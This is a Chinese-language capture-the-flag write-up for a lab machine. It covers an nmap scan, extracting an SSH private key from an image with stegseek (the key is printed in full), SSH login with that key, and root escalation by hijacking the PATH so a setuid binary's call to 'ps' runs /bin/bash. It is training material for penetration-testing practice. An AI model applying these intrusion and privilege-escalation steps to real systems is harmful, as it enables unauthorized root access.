

## 端口扫描

```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo nmap -sT -sCV -O -p 22,80 192.168.10.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 03:29 EDT
Nmap scan report for 192.168.10.17
Host is up (0.00067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 b5:77:4c:88:d7:27:54:1c:56:1d:48:d9:a4:1e:28:91 (RSA)
|   256 c6:a8:c8:9e:ed:0d:67:1f:ae:ad:6b:d5:dd:f1:57:a1 (ECDSA)
|_  256 fa:a9:b0:e3:06:2b:92:63:ba:11:2f:94:d6:31:90:b2 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: DRAGON BALL | Aj's
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:3C:C6:F9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 - 5.5 (98%), Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (96%), Sony X75CH-series Android TV (Android 5.0) (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (95%), Linux 3.1 (95%), Linux 3.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
```

## web渗透

![](images/2024-04-22-15-33-51.png)
robots没有有价值的信息
![](images/2024-04-22-15-49-26.png)
太卑鄙了，隐藏信息藏在了后面的源码中
这个是个目录
![](images/2024-04-22-16-04-13.png)
![](images/2024-04-22-16-09-24.png)
找到一张jpg
没什么思路试了下隐写
stegseek aj.jpg
提取到一个密钥信息

```bash
┌──(kali㉿kali)-âû/workspaceê
└─$ cat aj.jpg.out
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAwG6N5oDbTLLfRAwa7GCQw5vX0GWMxe56fzIEHYmWQw54Gb1qawl/
x1oGXLGvHLPCQaFprUek6CA8u2XPLiJ7SZqGAIg6XyyJY1xCmnoaU++AcI9IrgSzNyYlSF
o+QEIvwkNNA1mx9HuhRmANb06ZGzYDY6pGNvTSyvD4ihqiAXTye2A/cZmw7p5KLt4U0hSA
qucYb/IA4aa/lThOSp5QWSmPKaTm0FALRX38dRWbTBv5iR/qQFDheot+G3FlfGWqEBNuX8
SWnloCMT7QU+2N3YZYoDLI3zrQIOotKPbIUOWzciVpLXpnHPuKmHQ2SX6oJYmqpESID6l5
9ciPQzn2d7yGTZcyYO0PtnfBFngoNL1f55puIly39XeNWiUPebVSb5jBEyl+3pZ96s/BO5
Wvdopgb5VQX3h0832L3AkgW2X3tQp5FdkE/9nqxkSMfzZ6YdadpGVY5KboFiMnxWQyvB0a
ucq45Tn9kyfAAj2AQF46L9udVE4ylEkKw17oVaD5AAAFgKIce5GiHHuRAAAAB3NzaC1yc2
EAAAGBAMBujeaA20yy30QMGuxgkMOb19BljMXuen8yBB2JlkMOeBm9amsJf8daBlyxrxyz
wkGhaa1HpOggPLtlzy4ie0mahgCIOl8siWNcQpp6GlPvgHCPSK4EszcmJUhaPkBCL8JDTQ
NZsfR7oUZgDW9OmRs2A2OqRjb00srw+IoaogF08ntgP3GZsO6eSi7eFNIUgKrnGG/yAOGm
v5U4TkqeUFkpjymk5tBQC0V9/HUVm0wb+Ykf6kBQ4XqLfhtxZXxlqhATbl/Elp5aAjE+0F
Ptjd2GWKAyyN860CDqLSj2yFDls3IlaS16Zxz7iph0Nkl+qCWJqqREiA+pefXIj0M59ne8
hk2XMmDtD7Z3wRZ4KDS9X+eabiJct/V3jVolD3m1Um+YwRMpft6WferPwTuVr3aKYG+VUF
94dPN9i9wJIFtl97UKeRXZBP/Z6sZEjH82emHWnaRlWOSm6BYjJ8VkMrwdGrnKuOU5/ZMn
wAI9gEBeOi/bnVROMpRJCsNe6FWg+QAAAAMBAAEAAAGBAL3SUJf4tFtMd4Egj85s02Ch8p
nYEq2NObkPFZAtkNRFCaQafUdo72svGueFP0AI8q7bEuujqMByTHZvT5gq24MXsugDedE4
la417F2F5UK3FvPx47gFWuQj9NMSciXhJEt1KBsN98U7zzMkvRv3ZIC7H0zJQsojZ2xZmF
JjQzw8qJWbs/nTqf04l+TznYY+Q05S+IA1MTlmy8Xe7RweXxQVMuvZhvYmf3fld4vn7HF/
hwAFQ4Z+Qm4n/BYGHh5ACXQFffrEiJ4B/hvS8KinkhZ1FoMNTHlDVUR5ALoQ/w0pSTExVL
WeV3f5E6yRlGf+IGMjptYEkgSO4ScJzVhqjxtLp6RRxDR1S9eOBFC1b4t0buefxOMRkKbJ
xhOMubESFLDS/3Eq/pzOSPvFkzJSUitD+1yFiXeZA2f86Y+bZgfvS5EPo6xCqQq2EatZgN
/WEhnEc6smCpCIf1NDuzVjZVmHwd3mv30DP2+RiSoZ4yKasukSCkbsMtiucIgu5WSdIQAA
AMEAgcd2TQt4UEVmQ20rydBD+2qkQefw7nN27vq7IyUeDyr1CxhdPkFjFhVCCsk7lNsxtP
pyFIVMFLAUlt3eoKp4qU26kCtTIOnPLrMsiOwhVk/NU5fFSK3dqzVPNiNjWaLOwDmFYb39
s+aFuQm2Vy/RzkyHNRmdkVflJcrqNOQuGXzo2t8qsnaPI4QAzrjRWF53j0BHQqlRPfvlfz
SCC+KuMNvPJRRzhuRQmsbq9RWSLQk73ouTJwb3j9J55V86KI0nAAAAwQDlKLzSrV6qkMTO
fBDHyK45r0KC2h+a1f2GvSa+rfILHbxgGDCu6Qk4CJMgSVoM11EcDw0j/SxwsPlCxbqs0q
R/4WusHj1v/ysFb9MFlEcdXZOZShozjBU9PmkIbTBPSfdV6YoWhY5icG9Yy1WgNTv4+shR
Pl1uHDVsHxhbK1isOz5cV3dqxvSZHTQ3cQhIMxTvpXw+JAbpPzNXtSQ0raT1l94h0Kp6Hu
WvXuSZzwM8hGfYYFYlqL1l7RR7N46nBAsAAADBANb4j6c/cBPuITtIw+/GPKBb1Z15Su6b
cYmthvUYneQMnt2czKF3XqEvXVPXmnbu9xt079Qu/xTYe+yHZAW5j7gzinVmrQEsvmdejq
9PpqvWzsLFnkXYEMWdKmmHqrauHOcH0hJtEmHuNxR6Zd+XjiRsPuBGxNRE22L/+j++7wxg
uSetwrzhgq3D+2QsZEbjhO+ViDtazKZVjewBCxm7O0NhPFFcfnwTOCDLg+U8Wd1uuVT1lB
Bd8180GtBAAaGtiwAAAAlrYWxpQGthbGk=
-----END OPENSSH PRIVATE KEY-----
```
得到密钥后先改了一下权限
![](images/2024-04-22-16-28-14.png)
用root和aj去连，连不上
这里看到还有一个login页面的xmen
可能是用户名
连一下ssh
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo ssh -i aj.rsa xmen@192.168.10.17
Linux debian 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 07:09:06 2021 from 192.168.43.111
xmen@debian:~$ sudo -l
[sudo] password for xmen:
xmen@debian:~$ ls -la
total 36
drwxr-xr-x 4 xmen xmen 4096 Jan  5  2021 .
drwxr-xr-x 3 root root 4096 Jan  4  2021 ..
-rw------- 1 xmen xmen  543 Jan  5  2021 .bash_history
-rw-r--r-- 1 xmen xmen  220 Jan  3  2021 .bash_logout
-rw-r--r-- 1 xmen xmen 3526 Jan  3  2021 .bashrc
-rw-r--r-- 1 xmen xmen   43 Jan  2  2021 local.txt
-rw-r--r-- 1 xmen xmen  807 Jan  3  2021 .profile
drwxr-xr-x 2 root root 4096 Jan  4  2021 script
drwx------ 2 xmen xmen 4096 Jan  4  2021 .ssh
xmen@debian:~$ cat local.txt
your falg :192fb6275698b5ad9868c7afb62fd555
```
成功连接

## 提权（PATH）

```bash
xmen@debian:~/script$ ./shell
   PID TTY          TIME CMD
   882 pts/0    00:00:00 shell
   883 pts/0    00:00:00 sh
   884 pts/0    00:00:00 ps
xmen@debian:~/script$ cat demo.c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");
}
xmen@debian:~/script$ cd /tmp
xmen@debian:/tmp$ echo '/bin/bash' >ps
xmen@debian:/tmp$ chmod 777 ps
xmen@debian:/tmp$ export PATH=/tmp:$PATH
xmen@debian:/tmp$ ./shell
xmen@debian:/tmp$ echo PATH
PATH
xmen@debian:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
xmen@debian:/tmp$ cd ~/script/
xmen@debian:~/script$ ./shell
root@debian:~/script# whoami
root
root@debian:~/script# ls /root
proof.txt
root@debian:~/script# cat /root/proof.txt
   _____ __________
  /     \\______   \          ___  ___ _____   ____   ____
 /  \ /  \|       _/          \  \/  //     \_/ __ \ /    \
/    Y    \    |   \           >    <|  Y Y  \  ___/|   |  \
\____|__  /____|_  /__________/__/\_ \__|_|  /\___  >___|  /
        \/       \/_____/_____/     \/     \/     \/     \/






join channel:   https://t.me/joinchat/St01KnXzcGeWMKSC


your flag: 031f7d2d89b9dd2da3396a0d7b7fb3e2
```
shell执行了ps命令
将ps命令劫持为bash